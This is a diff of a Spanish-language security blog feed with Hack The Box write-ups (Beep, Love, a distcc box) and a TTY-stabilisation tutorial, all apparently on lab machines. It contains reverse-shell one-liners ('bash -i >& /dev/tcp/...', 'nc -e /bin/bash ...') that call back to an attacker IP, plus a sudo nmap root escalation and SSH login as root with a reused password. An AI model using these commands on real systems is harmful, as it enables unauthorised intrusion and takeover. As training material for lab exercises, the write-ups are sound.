+          RX bytes:100256 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;97.9 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  TX bytes:111602 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;108.9 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+          Interrupt:59 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:7558 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:7558 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1124965 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  TX bytes:1124965 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos encontramos dentro de la máquina, ahora para trabajar un poco mas ordenados; nos establecemos una conexión hacia nuestro equipo de atacante; por lo que ejecutamos el siguiente com ando y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.6/443 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.6] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.7] 56804
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;asterisk
+bash-3.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hacemos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; y comenzamos con la enumeración de los permisos que tiene el usuario &lt;em&gt;asterisk&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;asterisk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;101&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;asterisk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;asterisk on this host:
+    env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&quot;&lt;/span&gt;
+
+User asterisk may run the following commands on this host:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/shutdown
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmap
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/yum
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/touch
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/chmod
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/chown
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/service
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/init
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/postmap
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/postfix
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/saslpasswd2
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/hardware_detector
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/chkconfig
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/elastix-helper
+bash-3.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que tienemos multiples recursos que podemos ejecutar temporalmente como el usuario &lt;em&gt;root&lt;/em&gt;; para este caso se utilizará &lt;em&gt;nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+
+Nmap version 4.11 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
+
+Starting Nmap V. 4.11 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; press h &amp;lt;enter&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
+&lt;/span&gt;nmap&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
+sh-3.2# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+sh-3.2#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar las flags.&lt;/p&gt;
+
+&lt;p&gt;Otro método de acceso al sistema es mediante la validación de reutilización de contraseñas; validando si con las credenciales que identificamos a partir del &lt;strong&gt;LFI&lt;/strong&gt; nos dan acceso a través del servicio SSH como el usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh root@10.10.10.7
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh root@10.10.10.7&lt;/code&gt; nos aparece un error; sólo tenemos que agregar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oKexAlgorithms=+diffie-hellman-group1-sha1&lt;/code&gt; al comando para poder acceder:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-oKexAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;+diffie-hellman-group1-sha1 root@10.10.10.7
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.7 (10.10.10.7)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;10.10.10.7&lt;span class=&quot;s1&quot;&gt;' (RSA) to the list of known hosts.
+root@10.10.10.7'&lt;/span&gt;s password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------&lt;/span&gt;
+
+To access your Elastix System, using a separate workstation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PC/MAC/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@beep ~]# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@beep ~]#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A este punto ya somo usuarios administradores y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="LFI" /><summary type="html">Resolución de la máquina Beep en la plataforma de Hack The Box</summary></entry><entry><title type="html">Tratamiento de la TTY</title><link href="http://localhost:4000/tratamiento-tty/" rel="alternate" type="text/html" title="Tratamiento de la TTY" /><published>2021-09-07T00:00:00-05:00</published><updated>2021-09-07T00:00:00-05:00</updated><id>http://localhost:4000/tratamiento-tty</id><content type="html" xml:base="http://localhost:4000/tratamiento-tty/">&lt;p&gt;&lt;img src=&quot;/assets/images/tty/banner-tty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;tratamiento-de-la-tty&quot;&gt;Tratamiento de la TTY&lt;/h2&gt;
+
+&lt;p&gt;Ejecutamos los siguientes comandos cuando estemos dentro de un sistema linux a través de una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Presionamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + z&lt;/code&gt; y ejecutamos los siguientes comandos en la terminal de nuestro equipo de atacante:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]  + continued  nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora escribimos la palabra &lt;strong&gt;reset&lt;/strong&gt;, aunque no se muestre. Es posible que en algunos casos nos indique el tipo de terminal que deseamos utilizar, para este caso le indicaremos &lt;strong&gt;xterm&lt;/strong&gt;. Posterior modificamos el valor de las siguientes variables de entorno:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por último, modificamos las proporciones la &lt;em&gt;stty&lt;/em&gt; de acuerdo a los valores de nuestra terminal. Ingresamos el siguiente comando en nuestro equipo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;size
+46 131
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Aqui vemos que para este caso tenemos 46 renglones y 131 columnas; por lo tanto asignamos dichos valores a la tty de la máquina víctima:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;rows 46 columns 131
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos una tty totalmente interactiva, podemos hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + c&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + l&lt;/code&gt; y desplazarnos sin problemas y sin temor que se nos muera la conexión.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Arbitrary_File_Upload" /><category term="Patch_Management" /><summary type="html">Proceso para tener una TTY totalmente interactiva y que no se nos muera</summary></entry><entry><title type="html">Función extractPorts</title><link href="http://localhost:4000/extractPorts/" rel="alternate" type="text/html" title="Función extractPorts" /><published>2021-09-06T00:00:00-05:00</published><updated>2021-09-06T00:00:00-05:00</updated><id>http://localhost:4000/extractPorts</id><content type="html" xml:base="http://localhost:4000/extractPorts/">&lt;p&gt;&lt;img src=&quot;/assets/images/extractPorts/banner-extractPorts.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;extractports&quot;&gt;extractPorts&lt;/h2&gt;
 
@@ -204,7 +596,7 @@ C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&
 
 &lt;p&gt;Con esta conexión ya podemos movernos con mayor facilidad. Ya somos administradores del equipo y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Injection" /><summary type="html">Resolución de la máquina Legacy en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Love</title><link href="http://localhost:4000/htb-love/" rel="alternate" type="text/html" title="Hack The Box Love" /><published>2021-09-06T00:00:00-05:00</published><updated>2021-09-06T00:00:00-05:00</updated><id>http://localhost:4000/htb-love</id><content type="html" xml:base="http://localhost:4000/htb-love/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-love/banner-love.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;h1 id=&quot;love&quot;&gt;Love&lt;/h1&gt;
+&lt;h2 id=&quot;love&quot;&gt;Love&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.239.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.239
@@ -734,7 +1126,7 @@ ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
 ftp&amp;gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ingresamos como el usuario &lt;em&gt;anonymous&lt;/em&gt;, sin embargo, no se despliega información; por lo que analizaremos la información obtenida de nmap. Vemos que el servicio FTP está corriendo [[vsftpd 2.3.4]]; por lo que mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; buscamos posibles exploits.&lt;/p&gt;
+&lt;p&gt;Ingresamos como el usuario &lt;em&gt;anonymous&lt;/em&gt;, sin embargo, no se despliega información; por lo que analizaremos la información obtenida de nmap. Vemos que el servicio FTP está corriendo vsftpd 2.3.4; por lo que mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; buscamos posibles exploits.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit vsftpd 2.3.4
 &lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
@@ -762,7 +1154,7 @@ Shellcodes: No Results
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/k4miyo/CVE-2004-2687&quot;&gt;&lt;strong&gt;CVE-2004-2687.py&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Nos descargamos el archivo [[CVE-2004-2687]] a nuestra máquina, lo analizamos para ver si es necesario cambiar datos (para este caso no aplica) y procedemos a ejecutar programa.&lt;/p&gt;
+&lt;p&gt;Nos descargamos el archivo a nuestra máquina, lo analizamos para ver si es necesario cambiar datos (para este caso no aplica) y procedemos a ejecutar programa.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/k4miyo/CVE-2004-2687/k4miyo/CVE-2004-2687.py
 &lt;span class=&quot;nt&quot;&gt;--2021-08-27&lt;/span&gt; 20:49:39--  https://raw.githubusercontent.com/k4miyo/CVE-2004-2687/k4miyo/CVE-2004-2687.py
@@ -807,7 +1199,7 @@ optional arguments:
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ahora establecemos una conexión a nuestra máquina para tener una shell y hacemos  [[Tratamiento de la tty]]] para trabajar mas comodos. Nos ponemos en escucha por el puerto 4443:&lt;/p&gt;
+&lt;p&gt;Ahora establecemos una conexión a nuestra máquina para tener una shell y hacemos &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar mas comodos. Nos ponemos en escucha por el puerto 4443:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nohup &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.15 4443 &amp;amp;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
